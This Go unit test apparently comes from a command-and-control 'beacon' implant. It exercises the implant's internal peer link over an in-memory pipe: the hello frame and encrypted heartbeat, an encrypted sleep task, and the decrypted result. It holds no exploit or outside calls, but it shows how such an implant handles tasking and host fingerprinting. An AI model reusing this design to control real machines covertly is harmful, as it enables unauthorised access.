package core

import (
	"beacon/pkg/cascade"
	"beacon/pkg/command"
	"beacon/pkg/profile"
	"beacon/pkg/sysinfo"
	"beacon/pkg/utils/crypt"
	"beacon/pkg/utils/packet"
	"bytes"
	"net"
	"testing"
	"time"
)

func TestRunInternalSendsHelloAndReturnsTaskResult(t *testing.T) {
	originalProfile := profile.GlobalProfile
	defer func() {
		profile.GlobalProfile = originalProfile
	}()

	profile.GlobalProfile = profile.Profile{
		EncryptKey: "internal-test-key",
		HTTP: profile.HTTPProfile{
			EncryptKey: "internal-test-key",
		},
		SleepTime: time.Hour,
		Jitter:    0,
	}

	parent, child := net.Pipe()
	defer parent.Close()

	ctx := &Context{
		Meta: &sysinfo.MetaData{
			OS:          "test-os",
			Arch:        "amd64",
			Hostname:    "host",
			Username:    "user",
			InternalIP:  "127.0.0.1",
			ProcessName: "beacon.test",
			PID:         1234,
			ACP:         65001,
		},
		BeaconID:   0x1234abcd,
		SessionKey: bytes.Repeat([]byte{0x41}, sessionKeySize),
	}
	ctx.Outbox.Init()
	ctx.active.Store(true)

	handler := command.NewHandler(ctx.Meta.ACP)
	defer handler.Close()
	handler.SetID(ctx.BeaconID, ctx.SessionKey)

	agent := &Agent{
		Ctx:     ctx,
		handler: handler,
	}

	done := make(chan int, 1)
	go func() {
		done <- agent.runInternal(child)
	}()

	cmd, helloBody, err := cascade.ReadFrame(parent)
	if err != nil {
		t.Fatalf("read hello: %v", err)
	}
	if cmd != cascade.FrameHello {
		t.Fatalf("hello frame = %d, want %d", cmd, cascade.FrameHello)
	}

	helloParser := packet.CreateParser(helloBody)
	childID := helloParser.ParseString()
	heartbeat := helloParser.ParseBytes()
	if helloParser.HasError() {
		t.Fatalf("parse hello: %v", helloParser.Error())
	}
	if childID != "1234abcd" {
		t.Fatalf("child id = %q, want 1234abcd", childID)
	}
	if _, err := crypt.DecryptHeartbeat(profile.GlobalProfile.EncryptKey, heartbeat); err != nil {
		t.Fatalf("decrypt heartbeat: %v", err)
	}

	sleepPayload, err := packet.PackArray([]any{
		int32(2),
		int32(2500),
		int32(33),
	})
	if err != nil {
		t.Fatalf("pack sleep payload: %v", err)
	}
	taskBlock, err := packet.PackArray([]any{
		int32(7),
		int32(command.CommandSleep),
		packet.PackBytes(sleepPayload),
	})
	if err != nil {
		t.Fatalf("pack task block: %v", err)
	}
	encryptedTask, err := crypt.EncryptTask(ctx.SessionKey, packet.PackBytes(taskBlock))
	if err != nil {
		t.Fatalf("encrypt task: %v", err)
	}

	if err := cascade.WriteFrame(parent, cascade.FrameTask, encryptedTask); err != nil {
		t.Fatalf("write task: %v", err)
	}

	cmd, encryptedResult, err := cascade.ReadFrame(parent)
	if err != nil {
		t.Fatalf("read result: %v", err)
	}
	if cmd != cascade.FrameResult {
		t.Fatalf("result frame = %d, want %d", cmd, cascade.FrameResult)
	}

	plainResult, err := crypt.DecryptResult(ctx.SessionKey, encryptedResult)
	if err != nil {
		t.Fatalf("decrypt result: %v", err)
	}
	taskID, commandID, payload := parseFinalPacketCoreTest(t, plainResult)
	if taskID != 7 || commandID != command.CommandSleep || string(payload) != "Sleep policy updated" {
		t.Fatalf("unexpected result: task=%d command=%d payload=%q", taskID, commandID, payload)
	}

	if err := cascade.WriteFrame(parent, cascade.FrameClose, nil); err != nil {
		t.Fatalf("write close: %v", err)
	}

	select {
	case code := <-done:
		if code != 0 {
			t.Fatalf("runInternal exit code = %d, want 0", code)
		}
	case <-time.After(2 * time.Second):
		t.Fatalf("runInternal did not exit")
	}
}
